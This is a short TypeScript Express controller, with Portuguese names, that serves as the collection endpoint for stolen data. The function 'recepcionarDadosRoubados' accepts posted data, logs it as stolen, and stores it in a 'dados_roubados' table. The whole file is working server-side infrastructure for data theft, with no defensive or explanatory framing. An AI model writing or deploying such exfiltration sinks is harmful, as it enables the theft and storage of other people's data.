import { Request, Response } from "express";
import db from "../database";

export const recepcionarDadosRoubados = async (req: Request, res: Response) => {
    const { dados } = req.body;

    const query = `INSERT INTO dados_roubados (dados) VALUES ($1)`;
    console.log(`Recebendo dados roubados: ${dados}`);    
    try {
        await db.query(query, [dados]);
        res.status(201).json({ message: "Dados recebidos com sucesso" });
    } catch (err: any) {
        res.status(500).json({ error: err.message });
    }
};

